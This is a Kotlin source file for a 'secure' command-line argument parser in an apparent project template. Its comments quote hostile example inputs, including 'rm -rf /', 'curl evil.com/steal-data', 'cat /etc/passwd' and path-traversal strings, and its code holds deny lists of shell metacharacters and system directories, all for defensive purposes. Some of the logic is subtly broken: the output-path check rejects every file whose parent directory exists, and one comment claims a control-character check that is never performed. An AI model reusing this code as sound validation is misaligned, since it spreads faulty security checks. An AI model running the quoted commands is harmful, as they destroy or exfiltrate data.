// //////////////////////////////////////////////////////////////////////////////
// Kotlin Hybrid Architecture Template
// Copyright (c) 2025 Michael Gardner, A Bit of Help, Inc.
// SPDX-License-Identifier: BSD-3-Clause
// See LICENSE file in the project root.
// //////////////////////////////////////////////////////////////////////////////

package com.abitofhelp.hybrid.bootstrap

import java.nio.file.Paths
import kotlin.io.path.isDirectory

// --- Extracted constants for argument parsing ---
private const val MAX_ARG_COUNT = 100
private const val OUT_FLAG = "--out"
private const val OUT_PREFIX = "--out="
// -------------------------------------------------

/**
 * Secure argument parser with input validation and sanitization.
 *
 * ## Security First Design
 * This parser is designed with security as the top priority:
 * - Prevents command injection attacks
 * - Prevents path traversal attacks
 * - Validates all input before use
 * - Uses whitelist approach (explicitly allow safe patterns)
 *
 * ## Common Attack Vectors
 *
 * ### Command Injection
 * ```bash
 * # Dangerous input
 * app "John; rm -rf /"
 * app "Alice && curl evil.com/steal-data"
 * ```
 *
 * ### Path Traversal
 * ```bash
 * # Trying to write to system files
 * app --out=../../etc/passwd
 * app --out=/etc/hosts
 * ```
 *
 * ### Buffer Overflow
 * ```bash
 * # Extremely long arguments
 * app "A" * 10000000
 * ```
 *
 * ## Defense Strategies
 * 1. **Length Limits**: Prevent buffer overflow attempts
 * 2. **Character Blacklist**: Reject dangerous characters
 * 3. **Path Normalization**: Resolve .. and symlinks
 * 4. **System Directory Protection**: Block writes to OS directories
 * 5. **Null Byte Detection**: Prevent string termination attacks
 *
 * ## Why Object?
 * Singleton pattern ensures:
 * - Single source of truth for validation rules
 * - No state to corrupt between calls
 * - Thread-safe by design
 */
object SecureArgParser {

    // Security constants with rationale

    /** Maximum length for any single argument - prevents DoS via huge inputs */
    private const val MAX_ARG_LENGTH = 1000

    /** Maximum path length - matches typical OS limits */
    private const val MAX_PATH_LENGTH = 4096

    /** Maximum name length - matches domain constraint */
    private const val MAX_NAME_LENGTH = 100

    /**
     * Dangerous patterns that could lead to security vulnerabilities.
     * Each pattern has a specific attack vector it prevents.
     */
    private val DANGEROUS_PATTERNS = listOf(
        "..", // Path traversal - could escape to parent directories
        "~", // Home directory expansion - could access user files
        "$", // Variable expansion - could expose environment vars
        "`", // Command substitution - could execute commands
        ";", // Command separator - could chain malicious commands
        "&", // Background execution - could run hidden processes
        "|", // Pipe - could send data to other commands
        ">", // Output redirect - could overwrite files
        "<", // Input redirect - could read sensitive files
        "\n", // Newline injection - could inject log entries
        "\r", // Carriage return - could manipulate terminal output
        "\u0000", // Null byte - could truncate strings in C libraries
    )

    /**
     * Parses arguments with comprehensive security validation.
     *
     * ## Parsing Strategy
     * 1. Validate array size (DoS prevention)
     * 2. Process each argument with validation
     * 3. Track processed arguments to avoid duplicates
     * 4. Build safe configuration object
     *
     * ## Flag Handling
     * - `--verbose`, `-v`: Enable debug output
     * - `--out PATH`: Specify output file
     * - `--out=PATH`: Alternative syntax
     * - `--help`, `-h`: Show usage
     *
     * ## Positional Arguments
     * First non-flag argument becomes the name.
     * Additional arguments are ignored (safe default).
     *
     * ## Error Philosophy
     * Fail fast and loud! Better to reject suspicious input
     * than to allow potential security issues.
     *
     * @param args Raw command-line arguments
     * @return Safe, validated configuration
     * @throws IllegalArgumentException if any validation fails
     * @throws ShowHelpException if help was requested
     */
    fun parseSecure(args: Array<String>): AppConfig {
        // Validate array size - prevent DoS via thousands of arguments
        if (args.size > MAX_ARG_COUNT) {
            throw IllegalArgumentException("Too many arguments: ${args.size}")
        }

        var verbose = false
        var outputPath: String? = null
        var name: String? = null
        val processedArgs = mutableSetOf<Int>() // Track which args we've processed

        var i = 0
        while (i < args.size) {
            val arg = validateArgument(args[i])

            when {
                arg == "--verbose" || arg == "-v" -> {
                    verbose = true
                    processedArgs.add(i)
                }

                arg == OUT_FLAG -> {
                    processedArgs.add(i)
                    if (i + 1 < args.size) {
                        outputPath = validateOutputPath(args[i + 1])
                        processedArgs.add(i + 1)
                        i++ // Skip next arg since we consumed it
                    } else {
                        throw IllegalArgumentException("--out requires a file path")
                    }
                }

                arg.startsWith(OUT_PREFIX) -> {
                    // Handle --out=/path/to/file format
                    outputPath = validateOutputPath(arg.substring(OUT_PREFIX.length))
                    processedArgs.add(i)
                }

                arg == "--help" || arg == "-h" -> {
                    throw ShowHelpException()
                }

                arg.startsWith("-") -> {
                    throw IllegalArgumentException("Unknown option: $arg")
                }

                else -> {
                    // Non-flag argument - should be the name
                    if (name == null && !processedArgs.contains(i)) {
                        name = validateName(arg)
                        processedArgs.add(i)
                    }
                }
            }
            i++
        }

        return AppConfig(
            verbose = verbose,
            outputPath = outputPath,
            name = name,
        )
    }

    /**
     * Validates a single argument for common security issues.
     *
     * ## Validation Steps
     * 1. **Length Check**: Prevent buffer overflow attacks
     * 2. **Null Byte Check**: Prevent string termination attacks
     * 3. **Empty String**: Allowed (harmless)
     *
     * ## Why These Checks?
     * - Length limits prevent memory exhaustion
     * - Null bytes can cause issues in C interop
     * - Control characters can manipulate terminal output
     *
     * @param arg The argument to validate
     * @return The validated argument (unchanged if safe)
     * @throws IllegalArgumentException if validation fails
     */
    private fun validateArgument(arg: String): String {
        // Check length
        if (arg.length > MAX_ARG_LENGTH) {
            throw IllegalArgumentException("Argument too long: ${arg.length} characters")
        }

        // Check for null bytes and control characters
        if (arg.contains('\u0000')) {
            throw IllegalArgumentException("Invalid argument: contains null byte")
        }

        // Allow empty strings (they're harmless)
        if (arg.isEmpty()) {
            return arg
        }

        return arg
    }

    /**
     * Validates and sanitizes output file paths.
     *
     * ## Path Security Checks
     *
     * ### 1. Basic Validation
     * - Length limits
     * - Character validation
     *
     * ### 2. Pattern Detection
     * - Path traversal (..)
     * - Shell expansion (~, $)
     * - Command injection (;, |, etc.)
     *
     * ### 3. Path Normalization
     * ```kotlin
     * "./foo/../bar" → "/current/dir/bar"
     * "foo/./bar"    → "foo/bar"
     * ```
     *
     * ### 4. System Directory Protection
     * Blocks writes to:
     * - Unix: /etc, /usr, /bin, etc.
     * - Windows: C:\Windows, C:\Program Files
     *
     * ### 5. Permission Checks
     * Ensures parent directory is writable.
     *
     * ## Example Attack Prevention
     * ```bash
     * # These would all be rejected:
     * app --out=../../../../etc/passwd
     * app --out="/tmp/file; rm -rf /"
     * app --out=$HOME/.bashrc
     * ```
     *
     * @param path Raw path from user input
     * @return Safe, normalized path
     * @throws IllegalArgumentException if path is unsafe
     */
    private fun validateOutputPath(path: String): String {
        val sanitized = validateArgument(path)

        // Check length
        if (sanitized.length > MAX_PATH_LENGTH) {
            throw IllegalArgumentException("Path too long: ${sanitized.length} characters")
        }

        // Check for dangerous patterns
        DANGEROUS_PATTERNS.forEach { pattern ->
            if (sanitized.contains(pattern)) {
                throw IllegalArgumentException("Invalid path: contains '$pattern'")
            }
        }

        // Validate it's a proper path
        try {
            val normalizedPath = Paths.get(sanitized).normalize()

            // Prevent writing to system directories
            val absolutePath = normalizedPath.toAbsolutePath()
            val pathStr = absolutePath.toString()

            // System directories that should never be written to by user apps
            val forbiddenPaths = listOf(
                // Unix/Linux system directories
                "/etc", // System configuration
                "/usr", // System binaries
                "/bin", "/sbin", // Essential commands
                "/lib", // System libraries
                "/sys", "/proc", // Kernel interfaces
                // Windows system directories
                "C:\\Windows", // OS files
                "C:\\Program Files", // Installed programs
            )

            forbiddenPaths.forEach { forbidden ->
                if (pathStr.startsWith(forbidden)) {
                    throw IllegalArgumentException("Cannot write to system directory: $forbidden")
                }
            }

            // Check if parent directory exists and is writable
            val parent = normalizedPath.parent
            if (parent != null && parent.toFile().exists()) {
                if (!parent.toFile().canWrite()) {
                    throw IllegalArgumentException("Cannot write to directory: $parent")
                }
                if (parent.isDirectory()) {
                    throw IllegalArgumentException("Output path must be a file, not a directory")
                }
            }

            return normalizedPath.toString()
        } catch (e: Exception) {
            when (e) {
                is IllegalArgumentException -> throw e
                else -> throw IllegalArgumentException("Invalid path: ${e.message}")
            }
        }
    }

    /**
     * Validates and sanitizes name input.
     *
     * ## Name-Specific Security
     * Names have different security concerns than paths:
     * - Will be displayed in output
     * - Might be logged
     * - Could be used in templates
     *
     * ## Attack Scenarios
     * ```bash
     * # Log injection
     * app "Alice\nERROR: System compromised"
     *
     * # Terminal manipulation
     * app "Bob\r\nPassword:"
     *
     * # Command injection if poorly handled
     * app "Eve; cat /etc/passwd"
     * ```
     *
     * ## Validation Strategy
     * - More restrictive than general arguments
     * - Focus on display safety
     * - Prevent log injection
     *
     * @param name Raw name from user input
     * @return Safe, trimmed name
     * @throws IllegalArgumentException if name contains dangerous characters
     */
    private fun validateName(name: String): String {
        val sanitized = validateArgument(name)

        // Check length
        if (sanitized.length > MAX_NAME_LENGTH) {
            throw IllegalArgumentException("Name too long: ${sanitized.length} characters")
        }

        // Check for command injection attempts in name
        val dangerousInName = listOf("$", "`", ";", "&", "|", ">", "<", "\n", "\r")
        dangerousInName.forEach { pattern ->
            if (sanitized.contains(pattern)) {
                throw IllegalArgumentException("Invalid character in name: '$pattern'")
            }
        }

        return sanitized.trim()
    }
}

/**
 * Exception to indicate help should be shown.
 *
 * ## Why a Custom Exception?
 * Using exceptions for control flow is controversial, but here it:
 * - Cleanly separates help logic from parsing logic
 * - Allows help to be triggered from deep in parsing
 * - Makes it clear this is a special case, not an error
 *
 * ## Alternative Approaches
 * ```kotlin
 * // Could use sealed class
 * sealed class ParseResult {
 *     data class Success(val config: AppConfig) : ParseResult()
 *     object ShowHelp : ParseResult()
 *     data class Error(val message: String) : ParseResult()
 * }
 * ```
 *
 * But exceptions are simpler for this use case.
 */
class ShowHelpException : Exception("Show help requested")

/**
 * Convenience function to parse arguments with help handling.
 *
 * ## Two-Layer Design
 * 1. **SecureArgParser.parseSecure**: Core parsing logic
 * 2. **parseArgs**: Adds help display behavior
 *
 * This separation allows:
 * - Testing parser without side effects
 * - Different help strategies in different contexts
 * - Clean separation of concerns
 *
 * @param args Command-line arguments
 * @return Validated configuration
 * @throws ShowHelpException after displaying help
 * @throws IllegalArgumentException for invalid arguments
 */
fun parseArgs(args: Array<String>): AppConfig {
    return try {
        SecureArgParser.parseSecure(args)
    } catch (e: ShowHelpException) {
        printHelp()
        throw e
    }
}

/**
 * Prints user-friendly help message.
 *
 * ## Help Message Design
 * - Clear usage pattern at top
 * - Arguments before options (common convention)
 * - Short and long option forms
 * - Practical examples at bottom
 *
 * ## trimIndent()
 * Removes common leading whitespace from multi-line strings.
 * Allows nice formatting in code without extra spaces in output.
 */
private fun printHelp() {
    println(
        """
        Kotlin Hybrid Architecture Template
        
        Usage: hybrid [OPTIONS] [NAME]
        
        Arguments:
          NAME              Your name (optional, defaults to Anonymous)
        
        Options:
          -v, --verbose     Enable verbose output
          --out PATH        Write output to file (instead of console)
          -h, --help        Show this help message
          
        Examples:
          hybrid John
          hybrid --verbose Alice
          hybrid Bob --out greetings.txt
          hybrid --out=output.txt --verbose Charlie
        """.trimIndent(),
    )
}
